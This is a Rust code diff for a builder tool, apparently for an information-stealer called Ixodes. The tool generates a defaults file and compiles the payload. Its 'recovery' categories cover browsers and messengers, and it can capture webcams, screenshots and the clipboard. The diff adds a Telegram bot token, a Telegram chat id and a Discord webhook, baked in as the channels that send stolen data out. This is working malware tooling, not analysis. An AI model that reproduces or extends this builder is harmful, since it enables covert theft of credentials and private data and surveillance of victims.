@@ -67,15 +67,15 @@ fn recovery_dir(ixodes_root: &Path) -> PathBuf {
     ixodes_root.join("src").join("recovery")
 }
 
-fn settings_path(ixodes_root: &Path) -> PathBuf {
-    recovery_dir(ixodes_root).join("settings.rs")
+fn defaults_path(ixodes_root: &Path) -> PathBuf {
+    recovery_dir(ixodes_root).join("defaults.rs")
 }
 
 fn escape_rust_string(value: &str) -> String {
     value.replace('\\', "\\\\").replace('"', "\\\"")
 }
 
-fn render_settings_rs(settings: &RecoverySettings) -> Result<String, String> {
+fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
     let valid_categories = [
         "Browsers",
         "Messengers",
@@ -121,158 +121,41 @@ fn render_settings_rs(settings: &RecoverySettings) -> Result<String, String> {
     let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
     let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
 
+    let default_telegram_token = settings
+        .telegram_token
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
+        .unwrap_or_else(|| "None".to_string());
+
+    let default_telegram_chat_id = settings
+        .telegram_chat_id
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
+        .unwrap_or_else(|| "None".to_string());
+
+    let default_discord_webhook = settings
+        .discord_webhook
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
+        .unwrap_or_else(|| "None".to_string());
+
     Ok(format!(
         r#"use crate::recovery::task::RecoveryCategory;
-use base64::{{Engine as _, engine::general_purpose::STANDARD}};
-use once_cell::sync::Lazy;
-use std::{{collections::HashSet, env, str::FromStr}};
-use tracing::{{info, warn}};
 
-static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
-static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
-static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
-static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
-static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
-
-static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
-
-#[derive(Debug)]
-pub struct RecoveryControl {{
-    allowed_categories: Option<HashSet<RecoveryCategory>>,
-    artifact_key: Option<Vec<u8>>,
-    capture_screenshots: bool,
-    capture_webcams: bool,
-}}
-
-impl RecoveryControl {{
-    pub fn global() -> &'static Self {{
-        &GLOBAL_RECOVERY_CONTROL
-    }}
-
-    pub fn allows_category(&self, category: RecoveryCategory) -> bool {{
-        self.allowed_categories
-            .as_ref()
-            .map(|set| set.contains(&category))
-            .unwrap_or(true)
-    }}
-
-    pub fn artifact_key(&self) -> Option<&[u8]> {{
-        self.artifact_key.as_deref()
-    }}
-
-    pub fn capture_screenshots(&self) -> bool {{
-        self.capture_screenshots
-    }}
-
-    pub fn capture_webcams(&self) -> bool {{
-        self.capture_webcams
-    }}
-
-    pub fn capture_clipboard(&self) -> bool {{
-        self.capture_clipboard
-    }}
-
-    fn from_env() -> Self {{
-        let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
-            .ok()
-            .and_then(|value| parse_categories(&value))
-            .or_else(|| default_categories());
-
-        if let Some(categories) = allowed_categories.as_ref() {{
-            info!(
-                "restricting recovery to {{}} categories",
-                categories
-                    .iter()
-                    .map(|category| category.to_string())
-                    .collect::<Vec<_>>()
-                    .join(", ")
-            );
-        }}
-
-        let artifact_key = env::var("IXODES_ARTIFACT_KEY")
-            .ok()
-            .and_then(|value| decode_artifact_key(&value))
-            .or_else(|| DEFAULT_ARTIFACT_KEY.and_then(decode_artifact_key));
-
-        if artifact_key.is_some() {{
-            info!("artifact encryption enabled");
-        }}
-
-        let capture_screenshots =
-            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
-        let capture_webcams =
-            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
-        let capture_clipboard =
-            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
-
-        RecoveryControl {{
-            allowed_categories,
-            artifact_key,
-            capture_screenshots,
-            capture_webcams,
-            capture_clipboard,
-        }}
-    }}
-}}
-
-fn default_categories() -> Option<HashSet<RecoveryCategory>> {{
-    DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
-}}
-
-fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {{
-    let trimmed = value.trim();
-    if trimmed.is_empty() {{
-        return None;
-    }}
-    match STANDARD.decode(trimmed) {{
-        Ok(bytes) => {{
-            if bytes.len() != 32 {{
-                warn!(
-                    "artifact encryption key must be 32 bytes (base64); got {{}} bytes",
-                    bytes.len()
-                );
-                None
-            }} else {{
-                Some(bytes)
-            }}
-        }}
-        Err(err) => {{
-            warn!(
-                error = ?err,
-                "failed to decode artifact encryption key"
-            );
-            None
-        }}
-    }}
-}}
-
-fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {{
-    let mut set = HashSet::new();
-    for segment in value.split(',') {{
-        let trimmed = segment.trim();
-        if trimmed.is_empty() {{
-            continue;
-        }}
-        match RecoveryCategory::from_str(trimmed) {{
-            Ok(category) => {{
-                set.insert(category);
-            }}
-            Err(err) => {{
-                warn!("skipping invalid category filter {{trimmed}}: {{err}}");
-            }}
-        }}
-    }}
-    if set.is_empty() {{ None }} else {{ Some(set) }}
-}}
-
-fn parse_flag(key: &str) -> Option<bool> {{
-    env::var(key).ok().map(|value| {{
-        matches!(
-            value.trim().to_ascii_lowercase().as_str(),
-            "1" | "true" | "yes" | "on"
-        )
-    }})
-}}
+pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
+pub static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
+pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
+pub static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
+pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
+pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = {default_telegram_token};
+pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = {default_telegram_chat_id};
+pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = {default_discord_webhook};
 "#,
         default_categories = default_categories,
         default_artifact_key = default_artifact_key,
@@ -284,7 +167,7 @@ fn parse_flag(key: &str) -> Option<bool> {{
 fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
     let ixodes_root = ixodes_root()?;
     let recovery_dir = recovery_dir(&ixodes_root);
-    let default_settings = settings_path(&ixodes_root);
+    let default_settings = defaults_path(&ixodes_root);
 
     let entries =
         fs::read_dir(&recovery_dir).map_err(|err| format!("failed to read recovery dir: {err}"))?;
@@ -297,7 +180,7 @@ fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
                 return None;
             }
             let file_name = path.file_name()?.to_string_lossy().to_string();
-            if !file_name.ends_with(".rs") || !file_name.contains("settings") {
+            if !file_name.ends_with(".rs") || (!file_name.contains("settings") && file_name != "defaults.rs") {
                 return None;
             }
             let is_default = path == default_settings;
@@ -327,16 +210,16 @@ async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResu
 fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
     let ixodes_root = ixodes_root()?;
     let recovery_dir = recovery_dir(&ixodes_root);
-    let default_settings = settings_path(&ixodes_root);
-    let backup_path = recovery_dir.join("settings.rs.bak");
+    let default_settings = defaults_path(&ixodes_root);
+    let backup_path = recovery_dir.join("defaults.rs.bak");
     if !backup_path.exists() && default_settings.exists() {
         fs::copy(&default_settings, &backup_path)
-            .map_err(|err| format!("failed to back up settings.rs: {err}"))?;
+            .map_err(|err| format!("failed to back up defaults.rs: {err}"))?;
     }
 
-    let settings_rs = render_settings_rs(&request.settings)?;
+    let settings_rs = render_defaults_rs(&request.settings)?;
     fs::write(&default_settings, settings_rs)
-        .map_err(|err| format!("failed to write settings.rs: {err}"))?;
+        .map_err(|err| format!("failed to write defaults.rs: {err}"))?;
 
     let mut command = Command::new("cargo");
     command
